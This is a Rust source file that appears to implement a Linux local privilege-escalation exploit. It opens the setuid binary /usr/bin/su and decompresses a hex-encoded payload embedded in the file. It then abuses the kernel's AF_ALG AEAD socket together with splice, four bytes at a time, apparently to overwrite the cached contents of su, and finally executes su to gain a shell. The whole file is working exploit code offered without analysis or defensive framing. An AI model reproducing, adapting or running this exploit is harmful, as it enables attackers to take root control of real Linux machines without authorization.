#![allow(clippy::cast_possible_truncation, clippy::cast_possible_wrap, clippy::cast_sign_loss)]

#[cfg(target_os = "linux")]
mod inner {
    use std::io::{self, Read};
    use std::os::fd::{AsRawFd, FromRawFd, OwnedFd, RawFd};
    use std::process::Command;

    use flate2::read::ZlibDecoder;

    const TARGET_PATH: &[u8] = b"/usr/bin/su\0";

    const COMPRESSED_HEX: &str = "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3";

    const SHELL_CMD: &str = "su";

    const AF_ALG: i32 = 38;
    const SOL_ALG: i32 = 279;
    const ALG_SET_KEY: i32 = 1;
    const ALG_SET_AEAD_AUTHSIZE: i32 = 5;
    const ALG_SET_OP: i32 = 3;
    const ALG_SET_IV: i32 = 2;
    const ALG_SET_AEAD_ASSOCLEN: i32 = 4;

    #[repr(C)]
    struct SockaddrAlg {
        salg_family: u16,
        salg_type: [u8; 14],
        salg_feat: u32,
        salg_mask: u32,
        salg_name: [u8; 64],
    }

    fn make_sockaddr_alg(alg_type: &str, alg_name: &str) -> SockaddrAlg {
        let mut addr = SockaddrAlg {
            salg_family: AF_ALG as u16,
            salg_type: [0u8; 14],
            salg_feat: 0,
            salg_mask: 0,
            salg_name: [0u8; 64],
        };
        let type_bytes = alg_type.as_bytes();
        let name_bytes = alg_name.as_bytes();
        let type_len = type_bytes.len().min(14);
        let name_len = name_bytes.len().min(64);
        addr.salg_type[..type_len].copy_from_slice(&type_bytes[..type_len]);
        addr.salg_name[..name_len].copy_from_slice(&name_bytes[..name_len]);
        addr
    }

    fn hex_decode(hex: &str) -> Vec<u8> {
        (0..hex.len())
            .step_by(2)
            .map(|i| u8::from_str_radix(&hex[i..i + 2], 16).expect("valid hex"))
            .collect()
    }

    fn zlib_decompress(data: &[u8]) -> io::Result<Vec<u8>> {
        let mut decoder = ZlibDecoder::new(data);
        let mut out = Vec::new();
        decoder.read_to_end(&mut out)?;
        Ok(out)
    }

    #[allow(clippy::too_many_lines)]
    fn af_alg_encrypt(fd: RawFd, plaintext_len: usize, aad: &[u8]) -> io::Result<()> {
        let alg_fd = unsafe { libc::socket(AF_ALG, libc::SOCK_SEQPACKET, 0) };
        if alg_fd < 0 {
            return Err(io::Error::last_os_error());
        }
        let alg_sock = unsafe { OwnedFd::from_raw_fd(alg_fd) };

        let addr = make_sockaddr_alg("aead", "authencesn(hmac(sha256),cbc(aes))");
        if unsafe {
            libc::bind(
                alg_sock.as_raw_fd(),
                std::ptr::from_ref(&addr).cast::<libc::sockaddr>(),
                size_of::<SockaddrAlg>() as libc::socklen_t,
            )
        } < 0
        {
            return Err(io::Error::last_os_error());
        }

        let key = hex_decode(&format!("0800010000000010{}", "0".repeat(64)));
        if unsafe {
            libc::setsockopt(
                alg_sock.as_raw_fd(),
                SOL_ALG,
                ALG_SET_KEY,
                key.as_ptr().cast::<libc::c_void>(),
                key.len() as libc::socklen_t,
            )
        } < 0
        {
            return Err(io::Error::last_os_error());
        }

        if unsafe {
            libc::setsockopt(
                alg_sock.as_raw_fd(),
                SOL_ALG,
                ALG_SET_AEAD_AUTHSIZE,
                std::ptr::null(),
                4,
            )
        } < 0
        {
            return Err(io::Error::last_os_error());
        }

        let op_fd =
            unsafe { libc::accept(alg_sock.as_raw_fd(), std::ptr::null_mut(), std::ptr::null_mut()) };
        if op_fd < 0 {
            return Err(io::Error::last_os_error());
        }
        let op_sock = unsafe { OwnedFd::from_raw_fd(op_fd) };

        let total_len = plaintext_len + 4;

        let aad_prefix = [0u8; 4];
        let iov = [
            libc::iovec {
                iov_base: aad_prefix.as_ptr() as *mut libc::c_void,
                iov_len: aad_prefix.len(),
            },
            libc::iovec {
                iov_base: aad.as_ptr() as *mut libc::c_void,
                iov_len: aad.len(),
            },
        ];

        let op_data: [u8; 4] = [0, 0, 0, 0];
        let mut iv_data = [0u8; 20];
        iv_data[0] = 0x10;
        let mut assoclen_data = [0u8; 4];
        assoclen_data[0] = 0x08;

        let cmsg_space_op = unsafe { libc::CMSG_SPACE(op_data.len() as u32) } as usize;
        let cmsg_space_iv = unsafe { libc::CMSG_SPACE(iv_data.len() as u32) } as usize;
        let cmsg_space_assoc = unsafe { libc::CMSG_SPACE(assoclen_data.len() as u32) } as usize;
        let cmsg_buf_len = cmsg_space_op + cmsg_space_iv + cmsg_space_assoc;
        let mut cmsg_buf = vec![0u8; cmsg_buf_len];

        let msg = libc::msghdr {
            msg_name: std::ptr::null_mut(),
            msg_namelen: 0,
            msg_iov: iov.as_ptr() as *mut libc::iovec,
            msg_iovlen: iov.len(),
            msg_control: cmsg_buf.as_mut_ptr().cast::<libc::c_void>(),
            msg_controllen: cmsg_buf_len,
            msg_flags: 0,
        };

        unsafe {
            let cmsg = libc::CMSG_FIRSTHDR(&msg);
            (*cmsg).cmsg_level = SOL_ALG;
            (*cmsg).cmsg_type = ALG_SET_OP;
            (*cmsg).cmsg_len = libc::CMSG_LEN(op_data.len() as u32) as usize;
            std::ptr::copy_nonoverlapping(op_data.as_ptr(), libc::CMSG_DATA(cmsg), op_data.len());

            let cmsg = libc::CMSG_NXTHDR(&msg, cmsg);
            (*cmsg).cmsg_level = SOL_ALG;
            (*cmsg).cmsg_type = ALG_SET_IV;
            (*cmsg).cmsg_len = libc::CMSG_LEN(iv_data.len() as u32) as usize;
            std::ptr::copy_nonoverlapping(iv_data.as_ptr(), libc::CMSG_DATA(cmsg), iv_data.len());

            let cmsg = libc::CMSG_NXTHDR(&msg, cmsg);
            (*cmsg).cmsg_level = SOL_ALG;
            (*cmsg).cmsg_type = ALG_SET_AEAD_ASSOCLEN;
            (*cmsg).cmsg_len = libc::CMSG_LEN(assoclen_data.len() as u32) as usize;
            std::ptr::copy_nonoverlapping(
                assoclen_data.as_ptr(),
                libc::CMSG_DATA(cmsg),
                assoclen_data.len(),
            );
        }

        if unsafe { libc::sendmsg(op_sock.as_raw_fd(), &msg, libc::MSG_MORE) } < 0 {
            return Err(io::Error::last_os_error());
        }

        let mut pipe_fds = [0i32; 2];
        if unsafe { libc::pipe(pipe_fds.as_mut_ptr()) } < 0 {
            return Err(io::Error::last_os_error());
        }
        let pipe_read = unsafe { OwnedFd::from_raw_fd(pipe_fds[0]) };
        let pipe_write = unsafe { OwnedFd::from_raw_fd(pipe_fds[1]) };

        let mut src_offset: libc::loff_t = 0;
        if unsafe {
            libc::splice(
                fd,
                &mut src_offset,
                pipe_write.as_raw_fd(),
                std::ptr::null_mut(),
                total_len,
                0,
            )
        } < 0
        {
            return Err(io::Error::last_os_error());
        }

        if unsafe {
            libc::splice(
                pipe_read.as_raw_fd(),
                std::ptr::null_mut(),
                op_sock.as_raw_fd(),
                std::ptr::null_mut(),
                total_len,
                0,
            )
        } < 0
        {
            return Err(io::Error::last_os_error());
        }

        let mut result_buf = vec![0u8; 8 + plaintext_len];
        let _ = unsafe {
            libc::recv(
                op_sock.as_raw_fd(),
                result_buf.as_mut_ptr().cast::<libc::c_void>(),
                result_buf.len(),
                0,
            )
        };

        Ok(())
    }

    pub fn run() -> io::Result<()> {
        let fd =
            unsafe { libc::open(TARGET_PATH.as_ptr().cast::<libc::c_char>(), libc::O_RDONLY) };
        if fd < 0 {
            return Err(io::Error::last_os_error());
        }

        let compressed = hex_decode(COMPRESSED_HEX);
        let data = zlib_decompress(&compressed)?;

        let mut i = 0;
        while i < data.len() {
            let end = (i + 4).min(data.len());
            af_alg_encrypt(fd, i, &data[i..end])?;
            i += 4;
        }

        unsafe {
            libc::close(fd);
        }

        Command::new("sh").arg("-c").arg(SHELL_CMD).status()?;

        Ok(())
    }
}

#[cfg(target_os = "linux")]
pub use inner::run;

#[cfg(not(target_os = "linux"))]
pub fn run() -> std::io::Result<()> {
    Err(std::io::Error::new(
        std::io::ErrorKind::Unsupported,
        "AF_ALG and splice require Linux",
    ))
}
